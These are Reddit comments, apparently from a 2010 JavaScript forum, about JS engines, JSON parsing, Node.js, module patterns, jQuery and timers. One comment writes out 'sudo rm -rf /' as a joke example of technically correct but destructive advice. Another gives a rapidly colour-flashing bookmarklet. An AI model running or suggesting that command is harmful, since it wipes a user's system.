Beating even Webkit. ;D
Someone please fork a Firefox using the V8 engine.
If you link me to a build of Carakan that runs in a Mac console, I will add it. The script does not fire up a browser.
Sorry you think it's shitty, you don't have to look at it if you don't want. I made this for our JS team so we can get an idea of how we're doing.
Well sorry, I was too harsh. Especially now that I know the context (for a dev team not public viewing) it makes more sense. I apologize. 
Well, I'm writing a web application that uses computer generated JSON, but to bootstrap the application I have to hand roll a fair amount of code. Its annoying to have to keep track of commas when I add lines or copy/paste. Its much easier just to have a rule that each line ends with a comma, and make sure that my code follows that rule. &gt;Heck, why do you even use a custom JSON parser? Reference an existing one written by people smarter than you, and use the native JSON objet from ES5 when available. That is exactly what I am doing. All I did was remove the regex in my parser (Douglas Crawford's json.js) so that it will accept invalid JSON. Before I release my web app, I plan to either remove all trailing commas, so my JSON is confromant, or restore the regex but change it to accept trailing commas. I am not using a custom parser, just a modified one. &gt;people smarter than you Who cares if I'm smarter than Douglas Crawford or not? He's written a parser, its probably better than the one I would write even if he was an idiot, and its better tested. All I did was remove an annoying feature temporarily for development purposes. Why is everyone in the development community so obsessed with making sure other people do things "The Right Way"?
teleported goats.
The creator of that site is a Mozilla Developer too. It's Dvander (also works on Source Mod, Metamod:Source and other things)
You want to run just Carakan from the mac console? Don't know about that, but you can download the latest snapshot for mac (10.52) over here http://my.opera.com/desktopteam/blog/2010/04/09/mac-beta-2-well-almost
times tested...
For all the hate I give Apple over their closed platform nonsense, Webkit's a good engine and this is a step in the right direction... at least until someone slightly unhinged takes the time to formally prove their JS engine uncrashable.
You should add [IE9's Chakra](http://ie9buzz.com/post/Chakra-the-new-Javascript-engine.aspx) as well.
there doesn't seem to be any game here
That's not what I was hoping for.
What are the storage limits of the pre-HTML5 mechanisms? I assume it's trying at least flash, cookie, et. al.
HTML5 for compliant browsers, the [userData behavior](http://msdn.microsoft.com/en-us/library/ms531424\(VS.85\).aspx) for pre-IE8. The storage limit is 128KB per document and 1024KB per domain.
Neat wrapper, but all private methods are exposed publicly and it's using document.domain as the domain value instead of location.host - the former can change depending on the document script, the latter cannot.
So how is the data keyed and how reliable is it?
I don't really see why it needs a framework, all they use it for is JSON support, which can be done without tying it down to a framework..
[sure there is](http://marcgrabanski.com/webroot/resources/jquery-game-tmnt/)! You have to click the button and then the turtle wobbles at the bad guy, causing him to explode. Then another bad guy appears. If you don't click the button fast enough, the bad guy stands there doing nothing while April wriggles in despair. It's gripping stuff!
hmm isn't PersistJS better? http://pablotron.org/?cid=1557
Awesome! I've been looking for something like like this, and the fact that it supports Prototype "out of the box" is even better. Thank you OP!
https://chrome.google.com/extensions/detail/igiofjhpmpihnifddepnpngfjhkfenbp
window.location.href = "xyz.html"; should work without a problem. So I guess you have a form with no action and a submit button which sends the form to itself. So add - return false; - to the openWindow method so the form is not submitted to itself Or don't use a form Or don't use a submit button
exactly right. I failed to include the return false at the end of button's onClick handler. I did change the button type to "button" also.
Its a bit bugy. It displays all the "next" reddit ads in endless rows.
Not gunna lie, that was an impressive deduction.
Can someone explain the actual use of node.js? examples maybe? Their site doesn't seem to explain the actual uses for such a tool. It's nice and all, but what do I do with it?
I [already did this](http://pastebin.com/q2K3Zpzu) with Sizzle and a little hackery of my own to have the browser write assertions for JsUnit from the stylesheet on the page for me. Now, I'll admit, I'm by no means an excellent programmer and towards the end I let the complexity of my script overwhelm me by reinitializing some arrays at the end of a loop, but my script *works* albiet only in FF and suffers only the slightest normalization, being that shorthands have all initial properties mixed in with declared stuff rather than just the declared stuff and FF drops display:run-in, the only css 2.1 property it doesn't support (due to the specification being unclear). Otherwise FF plays nice and leaves everything else alone. The only bug with my script is it doesn't account for the cascade, so it might write an assertion for a property twice which would fail on the first instance overwritten rule. I'm going to give this script a whirl.
yup, anyone?
Hey i got this working let me know if you need the chrome extension. I'll put it on chrome extensions if its already not there.
@scabootssca Hey great extension but I built the river of reddit anyways :) https://chrome.google.com/extensions/detail/bjiggjllfebckflfdjbimogjieeghcpp
I wish it didn't require a framework.
A framework for writing network-based applications. Not web apps, though web apps can certainly be created using node. If you are interested in creating a blog, node might not be for you. If you are interested in creating an MMO engine, node might be for you.
[Projects / Applications using Node.js](http://wiki.github.com/ry/node/)
Actually I've spent the last couple weeks building a really awesome blog engine in node. http://github.com/creationix/wheat Yes, it's harder than spending 15 minutes in rails, but it's so much more flexible in terms of what is possible.
For sure - like I said, its *possible*, but there is so much more that can be done. Also, I know who I am replying to and props for your contributions to node.js!
Did anyone else find this useful?
Wait, does this mean you found it to be useful? It was mostly just a small exercise for me, but if you like it, awesome!
I've done something similar in jQuery on a project at work, as a way to store data from an ajax call that is used in multiple places on the page. As one element updates the effect of that update can then be propagated to the other subscribing elements. It also makes the save to the server call a bit cleaner than a non-data-bound approach. Monday morning I'm going to do a code compare and do some fix up if need be, I think your version may be cleaner, or maybe YUI is cleaner than jQuery.
I want to do the same example in jQuery, so I'll try to do it over the weekend so we can compare :D
I understand that it is just an example, I just hate the practice of calling the same exact selector more than once when there was no change in elements Y.all("#in1, #in2") This reminds me of mootools' custom events when tied to the class objects. It would look like var db = new Class({ Implements: [Options, Events], options: { onChange:function(){} }, initialize: function(options){ this.setOptions(options); }, get: function(){ }, set: function(){ this.fireEvent('change', [args]); } }); var db_instance = new db({ onChange: function(){ // do stuff } }); I left out the logic in the get/set methods. Different means to the same end
This is pretty darn cool. I work on a startup and do software consulting, and this has come up *numerous* times. How do we capture client-side errors, especially on AJAX-heavy web apps? I've thought about writing a client-side error logging service in the past. One feature suggestion: you could integrate with BlackbirdJS (http://www.gscottolson.com/blackbirdjs/) so that ExceptionHub also captures any log messages above a certain level. Great work, guys! When do you plan to announce the pricing scheme?
Thanks for the input, I updated my post.
NWMatcher is the only standalone library you can trust as selector engine if you need to replace your framework selector engine look no further. base2 is the only robust framework having a selector engine you can trust. 
http://jsbin.com/avani/12/edit This works, although I read http://weblog.bocoup.com/publishsubscribe-with-jquery-custom-events that this approach is slower than using higgins' jquery.pubsub plugin. Edit: removed useless DOM element in DB(), thanks gnarf! Edit2: fixed chrome related bug.
 &lt;input type="text" id="input_field"&gt; &lt;button onclick="document.getElementById('input_field').value='value1'"&gt;Value 1&lt;/button&gt; &lt;button onclick="document.getElementById('input_field').value='value2'"&gt;Value 2&lt;/button&gt;
problems arise when people do not follow ONE standard and want to go with their "better" syntax. Just agree on one or another syntax and stick with that for life. I don't like comma first, but will be happy to stick with a different chosen standard. Laziness is against programming. 
He's JavaScript's biggest troll. Ignore him.
You shouldn't use "this" in place of "exports". It's a behavior specific to Node, and won't work on most other CommonJS platforms (or possibly even in future versions of Node)
Correct. It's also not guaranteed to work on all CommonJS platforms, since they may use a different top scope for each module (in particular in secured environments)
Thanks! I will try this. :)
Also, many people do this to create an empty Array/Object var myArray = new Array(); var myObject = new Object(); This is much cleaner IMO: var myArray = []; var myObject = {};
 var myArray = [], myObject = {}; 
Trailing commas are not a problem in IE8, despite what this says.
Also, sorting to find the highest number is quite inefficient when you consider his next mention of Math.max. var numbers = [3,342,23,22,124]; Math.max.apply(null, numbers); // returns 342 
it says a lot about the state of javascript programming when using the built in String methods is apparently considered an advanced secret.
Going the other way, from arguments to an array, can be done this way: Array.prototype.slice.call(arguments) so (function(){ return Array.prototype.slice.call(arguments).join(' - '); })(1, 2, 3, 4); would emit 1 - 2 - 3 - 4
Javascript by it's nature is a language that a lot of people use, but few actually learn. For most people they just need x or y to happen on the page, and that can be easily accomplished by copy-paste. The tips here are obvious for anyone who has been working with javascript seriously for some amount of time, but the truth is most people who touch javascript don't have time to learn it the way people typically learn languages, but just occasionally glean understanding off the code the pasted into their site.
That's an excellent idea. Use a separate set of classes to reference tags by class name from javascript.
I think it's poorly documented as well. The MDC documentation is great but that didn't exist 3 years ago. That there's no "authority" to turn to on it, plus the split between the DOM and Javascript, is also very confusing for people that would want to "learn it proper-like."
How do I filter out submissions with certain hostnames in the URL? I've never seen anything of value from SM.
 var myArray = [], myObject = {}; Vertical alignment FTW!
It's not only cleaner but safer. Array and object can be overwritten by other code (eg. Array = MyClass) while the literals are language constructs.
This is Javascript! I know this!
greasemonkey
That would be One JavaScript Thing I Wish I Knew Earlier In My Redditage.
I've seen a few lua for javascript programmer guides, but no javascript for lua programmers guides. Here is what I've learned so far - Javascript arrays start from 0 - yay Lua arrays are implicit - If it's first index is a number and the indexes are continuous from there, it's an array, otherwise it's a table. This is supposed to be transparent but sometimes it's an issue (e.g. pairs() vs ipairs()). In javascript, there are Array() and Object() types. A Lua metatable is called a prototype in javascript. Lua uses {} for tables and 'begin,end' for functions. Javascript uses {} for both. Lua's syntax was pretty much designed to be used like javascript + JSON. Javascript has this weird quirk of null, NaN, and undefined. Lua does not have 'undefined'. In both languages, you need to use 'var' or 'local' when declaring variables in functions otherwise you are accessing globals. Javascript is unicode. Lua is '8-bit clean' but not exactly unicode friendly. Lua 'self' is called 'this' in Javascript. I'm pretty sure javascript has tail calls. Both support closures.
Insta-party: javascript:function v(){return parseInt(Math.random(1)*240+16).toString(16);}setInterval(function(){document.body.style.backgroundColor="#"+v()+v()+v();},100);void(0);
I'm Ron Burgundy?
The Number datatype is certainly not always a float in V8 and tracemonkey. It's a crockford-ism --- maybe something that was true in 1998 - but certainly not today. For instance, you have to be weary of 32 bit integer wrap around. If it was float, this wouldn't be the case. Also, the engines themselves back me up on this one.
Don't forget a leather strap to bite down on.
uh, that's not how it works.
Fantastic... Have any other answers that could more than loosely be defined as helpful? I'm obviously a n00b here, so if I need to read a FAQ before I post that's fine too, just give me something to go on.
http://www.htmlgoodies.com and if you really MUST use javascript serverside (more easily said than done) http://nodejs.org/
That's more like it :) Thanks! And yes, I must. I don't see any way around it in this case, unless you know of another way to get info off a DB on to a widget, without opening global access to the DB through your firewall.
look up DBSlayer
You're doing it wrong =) Read up on JSONP for cross domain AJAX calls. I think what you're looking for is a script/page (doesn't have to be JavaScript) on the the server that will take query parameters from your AJAX widget, sanitize them(!), run the query against the DB, and then return the result data, using the JSON format, back to the widget.
While technically correct, you're pointing them down the wrong path.
There's no such thing as 'local myLocalVar' in JavaScript. Just use 'var'. Likewise, 'global' doesn't exist.
Technically correct, the best kind of correct.
Can't say I disagree, but I'm a lousy programmer, so I tend to reinvent the wheel a lot trying to understand a fundamental tech, when I should just grab a cookie-cuttered solution. I'm looking at DBSlayer and JSONP and hopefully with the help of the two of you, I'll produce some results soon. Thanks!
No. suppose someone asks the easiest way to delete a ton of files because they're low on space. "sudo rm -rf /" is technically correct but it is not what the person is really looking to do.
I was unclear. In lua, the 'local' keyword is synonymous with 'var' in javascript. 
wait, I need to switch to a current nightly build to see this in the works? Did you post this in [2](http://aburgueria.com/blog/wp-content/uploads/2009/02/jaws19-2.jpg)[0](http://buzztown.net/wp-content/uploads/2008/07/hoverboard.jpg)[1](http://www.tepg.se/titles/%5BMovie%5DBack%20to%20the%20Future%202%20%281989%29_02.jpg)[5](http://www.premiere.fr/var/premiere/storage/images/diaporama/le-petit-homme/retour-vers-le-futur-2-back-to-the-future-ii-1989__7/1902287-1-fre-FR/retour_vers_le_futur_2_back_to_the_future_ii_1989_reference.jpg) via the [wayback machine](http://www.youtube.com/watch?v=Kkqn7O1lHFI&amp;feature=related)?
&gt;wait, I need to switch to a current nightly build to see this in the works? Mostly yes, FF3.7a "Minefield" will install alongside (as opposed to over) an existing FF install, and switching to and from the chrome dev channel is less than a minute of work (although the most recent autoupdate broke webgl, that should be fixed soon) &gt;Did you post this in 2015 via the wayback machine? No, I've just been working with WebGL since September when it was first added to FF.
screenshots?
Gasp! Using `with`!! Douglas Crockford would be furious. :P
But Resig would shrug his shoulders. One of them has a tool I use daily, the other, does not.
meh, I avoid `with` in the library proper to avoid issues, but here it does help with readability
[yup](http://imgur.com/gDhj3) 
Saw your presentation @ BarCampRoc. Congrats on the poster submission! :) 
+1 you couldn't have said it better
SSJS is definitely gaining in popularity. I just got hired by a pretty large software shop to do nothing but SSJS. The 3rd-party extensions to their platform are written exclusively in JS and run on top of Rhino.
This is a cross post along with /r/programming. http://www.reddit.com/r/programming/comments/buntj/stack_overflow_style_notifications_jquery_tutorial/
 &gt;&gt;&gt; x=9007199254740991 9007199254740991 &gt;&gt;&gt; ++x 9007199254740992 &gt;&gt;&gt; ++x 9007199254740992 Doesn't look like 32bit wrapping to me. (Every engine behaves like this.)
TIL that I am prone to seizures.
I'd prefer client-side Ruby, actually &gt;..&lt;
Have you played much with V8-bound solutions, such as Node? If so, do you find either V8 or Rhino presents special challenges over the other?
I have also worked with Server Side Javascript for a couple relatively large scale sites. These sites were deployed well over a year ago so while there has been some sweet recent developments in frameworks, SSJS isn't as new as you may think.
It's more subtle and less obvious then that. The typechecking system is fairly complex. 
I don't even start until next week so I can't give you any useful insight. I was just lending some support to the idea that SSJS is something significant.
Doesn't anyone remember the Netscape server that did server-side JavaScript? I never used it, but IIRC, it did everything you could want in wholesome, pure JavaScript. That was more than ten years ago... I've always wondered why JavaScript didn't have a stronger presence on web servers. It's a great language and it would be so nice to write validation only once and have it run on the server *and* browser.
Even less common though.
So this only populates one value. I need button 1 to populate one form and button 2 to produce feilds for an entirely different form. Kinda like drop down menus but instead of a menu it creates form feilds. input boxes, check boxes ect, ect that can be filled out and be submitted. 
There are ways to do it, but they're still a little ugly, such as importing JRuby as an applet
What's the point in a footer if you never reach it?
http://www.w3.org/TR/1998/WD-ruby-19981221/ HTML has had a "ruby" tag since 1998.
The DOM pretty much killed people's perceptions of the language for a great many years.
apparently that's a different "ruby". google "ruby markup"
The idea is same. Attach a function to the click event to each buttons and let them fill in the form. &lt;button onclick="fillForm1()"&gt;Button 1&lt;/button&gt; &lt;button onclick="fillForm2()"&gt;Button 2&lt;/button&gt; Go implement `fillForm1()` `fillForm2()`.
&gt; if there was a standard, well-implemented &lt;input type=date&gt; element then I would be happy. http://www.w3.org/TR/html-markup/input.date.html 
&gt; well-implemented
!false
Numbers in Javascript are IEEE-754 (IEC 559) Doubles with a resolution of 53 bits. See ECMA-262 section 8.5 for further details.
&gt; Lua 'self' is called 'this' in Javascript. 'this' is the current scope object. There is also a Global object which can be referenced with 'this' in the global scope, or with 'window' and 'self' in the browser, with self being a property on the window object.
Ug ... yes, I know what ecma 262 says. I also know that it depends on the operation. ~((X &amp; 0xFFC00) &gt;&gt; 2) | (Y ^ Z) will work fine in JS - and treat things just as you would expect for instance. * alert(~0) will give you your -1. * alert(-1 ^ (1 &lt;&lt; 31)) will give you what you expect for 32 bit twos complement ints. * alert(1 &lt;&lt; 32) will usually wrap around at 31 for the shifts... * This code ought to emit the "1" you are expecting alert( ((1 &lt;&lt; 30) * 16 + 1) % ((1 &lt;&lt; 30) * 8) ); Anyway, As I said, JS's numbers are more subtle then you think - you can coerce the number into an integer, then stuff a bunch of operations in it before it goes back out as a float. But you need to have a intimate understanding of the actual implementations AND the ecma standard. And sometimes you may do it accidentally and get a wrap-around - I certainly have. But really, it's too much work. Don't bother - the much more frustrating thing is when you forget to check the type of a variable X and then add 1 to it and get string(x) + string(1). I hate that.
I look at the *with* statement like a style choice: Should I pop my collar today? No, I don't want to look like a douche bag. ;)
Throws my browser (Firefox 3.6.3) into some odd infinite loading after it triggers what appears to be a full page refresh.
Works for me (Firefox 3.6.3). Although it doesn't really seem to make sense as a bookmarklet. Would be more useful as an extension or greasemonkey script.
It's a bookmarklet so it can work cross browser. The code is all there, so it can be adapted to a site, if someone choose to do so.
`setTimeout`, WTF? There's a `scroll` event for a reason. Also, if you're going to do an interval, the appropriate function is `setInterval`.
setInterval is *evil!* ;) No, seriously, it is. Refactor any code you have to use setTimeout instead. Pro tip.
It's not that bad for periodically polling with Ajax to get new data for whatever it is your making. For anything else, I agree that it is evil.
If only IE supported watch, then all this wouldn't be needed. The concept behind this is quite eye opening though. Basicly, a setter that triggers an event when it is set. I like it!
I agree, for short intervals like this. They tend to stack up. But if you have something really long, like 30 seconds, then it's not *hateful*.
Yes, there is a scroll event. But implementing that in a cross browser way causes a hell of a lot more code. This whole bookmarklet weights in at less then 450 chars...and most of that is the div styling. If it wasn't for that, then yes, I am being dumb.
I misunderstood the title. I was expecting something like the Binford tools 2400hp scroll-o-matic.
You get some of this built-in if you use jQuery.data(), which has its own change events that you can subscribe to.
While it doesn't look like it has much practical purpose, this kinda of experiment really shows off the expressive power of JavaScript. I'm not advocating the use of this, but it's neat that you can do it.
Hey, I didn't know that! The API states that it requires a DOM element though. I try not to touch the DOM if I can avoid doing so, since it's always going to be slower crossing the JS to DOM bridge than staying in JSland.
I stand corrected... var foo = {}; jQuery.data(foo, "narf", "point"); jQuery.data(foo, "narf");​​​​​​​​​​​​​​ // "point" 
I have never actually used this feature yet, but I could see it being fairly useful, especially outside of the DOM, like you mention.
Rhino's performance was a big drawback. Part of the resurgence is due to V8 and SpiderMonkey.
I did not like this at first, but am coming around. I've started using it in my code.
Pretty please don't do this.
John Resig says: http://news.ycombinator.com/item?id=1296504
Also see the AUTHORS file: http://github.com/mitsuhiko/classy/blob/master/AUTHORS and my announcement tweet: http://twitter.com/mitsuhiko/status/12902227050
I wonder if anyone on /r/javascript has any input regarding this question?
Actually, the pattern(s) in the [linked answer](http://www.adequatelygood.com/2010/3/JavaScript-Module-Pattern-In-Depth) are what we use all the time. I mean, just look at it: var gib = (function() { var g = {}, seed = 12; function magic(target, damage) { return [target, 'recieves', damage, 'damage!'].join(' '); }; g.castMagic = function(npc) { var dmg = Math.floor(Math.random() * seed); alert(magic(npc, dmg)); }; return g; })(); gib.castMagic('rob'); I know that's an absurd example with zero real-world use, but you can see the flexibility that it affords in a language where you can do damn-near anything (e.g., `function alert(msg) { console.log(msg); };`). You've got methods, (mostly) privates, internal bits and a clean universe to write it all in. For larger projects you can extend things so that you have sub-modules (as mentioned in the article). I wholeheartedly recommend module patterns. They're even easier to get your mind around if you've been working with the likes of jQuery.
Thanks a lot for your reply. I've checked out AdequatelyGood, it's a great resource for this pattern. I still consider myself a JS novice, but as I've dived deeper into JavaScript, I have recognized the benefits of using the module pattern to structure my code. As for larger projects, how would you recommend I organize the sub-modules? I'm thinking each "arm" should be in its own module file. Although I recognize its power, I've never used this pattern in a real-world scenario, so I have no idea how to structure my code when it comes to multiple modules under each "project".
It can depend on what you're doing, but generally I'd say that what you're considering is the way to go. To help solidify things (because I know uncertainty can be a killer), look at how jQuery works. You have your core module loaded and then load other files that extend/amend this module to suit the page/app. This is a great example of the module pattern on a large-scale, and is part of what makes writing jQuery plug-ins so easy. That said, it's also part of why there are so many bad ones... :D But don't take my word for it. I'm sure there'll be others chiming in soon with other awesome advice. What's nice about JavaScript is that you can mold it to be whatever you want, within reason.
I use the module pattern **a lot** almost exactly like actionscripted described. I just dislike the var x = (function(){ // ... })(); notation so the ony change I'd make is: var x = new function(){ // ... };
I dig the work you did on Jinja. This looks cool too. I always smile when I see a link to pocoo.
nice stuff, Armin! Some questions though: - does classy support inheritance chains (e.g. Animal -&gt; Mammal -&gt; Tiger)? - how is the performance compared to Crockford's Functional Inheritance Pattern?
He's got some cheek.
&gt; does classy support inheritance chains (e.g. Animal -&gt; Mammal -&gt; Tiger)? Yes &gt; how is the performance compared to Crockford's Functional Inheritance Pattern? Functions not calling $super have zero overhead compared to standard JavaScript prototype inheritance, $super adds another function call, do the math.
&gt; You love JavaScript and use jQuery or another lightweight library extensively but you notice that your code becomes messier and messier the larger the application grows? Well, that’s where Classy comes in No, that's where mootools comes in.
Since you are exposing your solution for "classical OOP" in JS, I hope you will as well accept some critics. I haven't tested it, but simply reading your code I spotted some problems. 1) Instantiating without using the 'new' statement, the '__init__' method is called twice. 2) IE6 have problems with try/finally (try/catch/finally is OK). Also it is not clear to me why "Class.extend". Your 'Class' is the base class, but "Class" is not a proper name for a class, maybe for a metaclass. "Class.create" would make much more sense, where 'Class' would be a metaclass, and an 'Base' the base class. EDIT: &gt; Functions not calling $super have zero overhead compared to standard JavaScript prototype inheritance, $super adds another function call, do the math. In your current implementation, $super adds **3** function calls (2 more by calling getOwnProperty). Also, constructors have an additional function overhead.
Interesting. Definitely looks lightweight, which is good, but I've strongly been considering Joose lately. It's a bit heavier, but allows for a lot more options (it's basically Moose for Javascript).
&gt; The name reflected Netscape’s marketing efforts — not any underlying relationship. Actually, the truth is a bit more complex: http://weblogs.mozillazine.org/roadmap/archives/2008/04/popularity.html
I would urge you to at least take a look at the [CommonJS spec](http://commonjs.org/) spec. You can then still do (this is an example in node.js): var project = { arm : { http : require('http') } } project.arm.http.createServer(function (request, response) { response.writeHead(200, {'Content-Type': 'text/plain'}); response.end('Hello World\n'); }).listen(8000); 
Does anyone here have any suggestions?
Yeah, try Stack Overflow. That site is great for stuff like this!
and now silverlight: http://www.rubyinside.com/ironruby-silverlight-ruby-in-browser-3192.html
&gt; Instantiating without using the 'new' statement, the 'init' method is called twice. Fixed. &gt; IE6 have problems with try/finally (try/catch/finally is OK). In IE6 this will not unset the $super on exceptions, I don't see a good way to fix that that does not cause troubles for other browsers. Also, not sure for how long IE6 stays a target I care about. An yes, $super adds a couple of more.
the only downside of these "python inspired" classes is that private methods are not supported, as python doesn't know private methods either.
Those two "notations" are entirely different things though. The first one assigns the result of a self-invoking function and the second one assigns a function. The first one allows you do create private properties and functions very easily. The private stuff is inside the self-invoking-function's closure and the public stuff is inside the object this function returns. Also note that it should end with "}());" since you're wrapping the declaration and invocation. I.e. the whole thing. AS3 for example only accepts it this way since the other one is just nonsense.
Er, I know that Android runs off of JAVA, rather.
Very interesting work! I have longed for a real build system that was convenient to use for JavaScript projects. I'll definitely look at applying this to future large projects.
jQuery runs in the DOM already, so nothing stops us from using a hidden data node and its [onpropertychange](http://msdn.microsoft.com/en-us/library/ms536956\(VS.85\).aspx) event. This has been supported since IE 5.0.
haha 2 down votes for asking for help? you suck my balls reddit
Yes, and there are a few wrappers around this onpropertychange event and watch, depending on context. Those are great until you need to watch something like window.location.hash There is no method that is better in all situations, so it's nice to understand them all.
Node.js is going to be big.
This is a terrible article. All over the place, uninformative and poorly written. 
Yes, sounds like they are saying that - although you keep the copyright on your work and can use it and sell it in any way that you, yourself, want to - they have the right to use your work in any way, shape, or form that they want to too. REALLY shitty and dirty, Google.
Its a website they are using to market their product, what else would you expect to happen when you submitted your work to it? Just because Google does something with the sole purpose of profit doesn't make them shitty and dirty. I bet you're the type person who worships false gods and then throws them under the bus once you realize they aren't perfect.
I just pushed 0.2.0 of this which adds support for inspecting the call chain. See [the spec](http://bit.ly/bY4Rnw) for an example or [the history file](http://bit.ly/9hpa3d) for an overview.
Also check out some of the Raphael charts. Very cool.
this.href = 'new.site' is shorter.
Thanks for the advice, updating.
Uh, copying snippets off a webpage will never make you a "JavaScript Pro". Learning to understand JavaScript at a fundamental level will. These are nifty snippets, but some truth in headlines here, plz...
parseJSON? Isn't that just eval - but without a try/catch so that it will just silently crash on error? And what's with this "data" thing ... who the hell wants to strongly couple their data with specific UI elements? 
DMCA from Kick-Ass owners in 3...2...
Demo: http://www.addyosmani.com/resources/shinetime/ Shows that you can replace things that would traditionally be done in Flash with Javascript. I'm just not sure how much of a Good Thing that is...
I cringed and had the same general thought. This kind of dreck is embarrassing. "Pro"...jesus.
&gt; parseJSON? Isn't that just eval - but without a try/catch so that it will just silently crash on error? No. 1. JSON parsers generally do a bit of validation, that's important especially when the json comes from untrusted sources (and yes, json *can* come from untrusted sources) as it opens the door to code injection attacks. 2. For a while now, some browsers have provided access to their native Javascript parsers for JSON data: Firefox &gt;= 3.5, Webkit (Safari, Chrome), IE &gt;=8, Opera &gt;= 10.5, and libraries can delegate for much improved performances with no loss in security. That native interface is, in fact, part of ECMAScript 5. 3. Silently crash on error? What? &gt; And what's with this "data" thing ... who the hell wants to strongly couple their data with specific UI elements? It's generally UI-related data, and should work correctly cross-browser (whereas localStorage isn't yet available everywhere, as far as I know). And it allows for data scoping, making data automatically disappear when the relevant application section goes away.
This is cool and all, but haven't they heard of .stop()? Try rolling in and out of an image rapidly to see what I mean.
Something most jQuery hobbyists overlook. I always know someone's using jQuery when I can queue effects up. :D
Am I the only person that hates interfaces that act on rollovers - especially dropdown menus? If I want something to happen I'd rather click. With touchscreen interfaces becoming more popular I think this is going to be more important.
Just a minute ago I was checking some image gallery demo where the code listings were headed: "html", "css" and "jquery", which was funny on it's own but "snippets that will make you a pro" takes the cake. Well done.
Man, I... totally... fell like a pro now.
parseJSON also prevents you from running arbitrary code, so if someone hijacks your connection they can't steal the users' cookies, submit to forms, and rewrite the page.
That's a minuscule gain at most as the only threat model that has a non-zero gain from that class of scrutiny is exceedingly rare. How would someone hijack a connection and be limited at the application layer? It doesn't work this way. Sure, if your assumption is completely dynamic pages wherein all the code and layout is done upfront, I agree with you. But what about the other 99.999 9% of websites? FB does latent code loading and a reload on a new tab, so you can't use that. Google Docs does the same.
Like, just yesterday: http://www.reddit.com/r/javascript/comments/bz4sf/31_jquery_snippets_that_will_help_make_you_a/ I swear... Equally poorly written.
1. Example? 2. The Function("params", "code") declaration has been around since [Netscape 3](http://web.archive.org/web/19970615123737/http://developer.netscape.com/library/documentation/communicator/jsref/index.htm). That's how the [lovely jquery](http://pastebin.com/7MyTqMGn) does it. 3. Yes, .ajax, .get, .getjson no matter how you wrap it, it will crash if not well formed - and do so silently &gt; It's generally UI-related data, and should work correctly cross-browser (whereas localStorage isn't yet available everywhere, as far as I know). localstorage? You are talking about the 1M/domain, 256K/page storage of HTML5? There's cross browser equivalents; you can even do it in your &lt;hype&gt;[almighty jquery](http://www.jstorage.info/)&lt;/hype&gt; on IE6 And what does that have to do with the non-persistent .data storage? If you really want to do $("#elementname").data instead of data.elementname then ok, you have your own silly syntax. Using it as an excuse to be sloppy with resource management is irresponsible.
&gt; Example? Example of what? &gt; The Function("params", "code") declaration has been around since JS 1.2 which is Netscape 3. *That's how the lovely jquery does it.* Not quite. It uses native implementations if available, and it falls back on Function if native isn't available. And it starts by validating that the input is actually json. &gt; Yes, .ajax, .get, .getjson no matter how you wrap it, it will crash if not well formed - and do so silently You aren't talking about json anymore here, you're talking about json *within the context of a network request* which is an entirely different situation. The part eating the error is the request/response handling code, jQuery.parseJSON does raise an exception in case of invalid JSON.
Example 5 is wrong for the purpose of optimization. The sizzle engine works by going from right to left, not left to right. The example listed: var in_stock = $('#shopping_cart_items input.is_in_stock'); Will first select all inputs with class 'is_in_stock' and then limit the inputs to the are children of 'shopping_cart_items'. A better way to do what he was suggesting is to give a context. The example should have been something like this: var in_stock = $('input.is_in_stock', $('#shopping_cart_items')); 
note the **new** keyword, which essentially executes the function.
Oh... never mind then. I don't use `new` at all. The only exception is `(new Date()).getTime()` and `new Image()`. The thing with `new` is... if you forget it, `this` is bound to the global object. There is no error message and it may work fine for a while, which makes it somewhat hard to track down. So, from my point of view it's just some error prone construct that doesn't offer any benefits.
So many things wrong here. The author should really look into `live()` and should avoid using `browser()` stuff as [mentioned on the jQuery API page](http://api.jquery.com/jQuery.browser/): &gt; We recommend against using this property, please try to use feature detection instead Also, when did the XCode icon come to represent jQuery?
Pretty cool in concept. Seems to only support a few CSS3 tags, though. If this could be expanded to more tags I might consider using it. Still doesn't matter much when you still have to call '-moz' and '-webkit' for most CSS3 functions. Why can't they just make it standard yet?
I couldn't agree more on vendor prefixes. http://www.quirksmode.org/blog/archives/2010/03/css_vendor_pref.html 
This is great! Just be careful with jQuery selectors and that VML. 
Also crashes Chrome.
For me in Chrome it won't crash, just give an error message that there went something wrong, what version of Chrome and operating system are you using?
Is this anything more than a way to crash safari?
How is it possible to throw a god (even a false one) under the bus? I agree with your point, though. If you don't want to agree with the TOS, don't submit. 
The error that "Something went wrong" is the chrome browser process crashing.
No crash for me in Chrome.
Pretty comprehensive list. I posted something similar a while ago with links to both the Track A and Track B talks: [here](http://palagpat-coding.blogspot.com/2010/04/in-case-you-missed-it-jsconfus-2010-day.html) and [here](http://palagpat-coding.blogspot.com/2010/04/in-case-you-missed-it-jsconfus-2010-day_23.html)
Wouldn't the logical next step for such a script be to remove the need for those -moz and -webkit prefixes? A good chunk of what that .htc behavior thingy does is to add IE proprietary styles. It wouldn't be a stretch to rewrite it as something that'd load with a `&lt;script src=css3.js&gt;&lt;/script&gt;` and adjust "pure" css3 styles into whatever css soup current browsers require. 
TL/DW: * Stoyan Stefanov: Touch the DOM as infrequently as possible * Nicholas Zakas: Running JS blocks the UI. Run long tasks split up and with timers (or html5 webworkers) * Ross Harmes: Multipart XHR = Put all your resources (css, images, …) together into one request. This actually sounds pretty awesome - see [here](http://techfoolery.com/mxhr/) for demo. * Julien Lecomte: Use build tools to combine and compress your JS files. * Matt Sweeney: Use Firebug, it's plugins YSlow and Google Page Speed or other browser's tools to find out what's slow on your webpage. 
Separation of code, data and layout? Also, there is no need for an additional HTTP request when you can simply inline the scriptlet.
Providing a context is fine, but it really just adds an additional implicit function call when compared to calling find. var in_stock = $('#shopping_cart_items').find('input.is_in_stock');
understanding javascript at a fundamental level will most likely make you insane. function foo() { function bar() { var f = function() 42; function f() 4711; function f() 4711; var f = function() 42; return f; return f; } } now, what is foo()() === bar()()
Thanks for the synopsis. I don't understand Yahoo's obsession with posting videos.
DMCA: "I got YOUR a present! It's an Ass-Kicking." sic.
Processing is a fairly easy to use graphics programming/visualization/interactivity toolkit. It's pretty fun to play with. [There's a couple books on it if you're curious.](http://processing.org/learning/books/) Here are [some demos](http://processing.org/exhibition/). Someone wrote [a retro RPG using it](http://benhem.com/games/wayfarer/). [Processing.js](http://processingjs.org/), an implementation in pure HTML5/Javascript (note the interactive graphics in the header). [Demos.](http://processingjs.org/exhibition) 
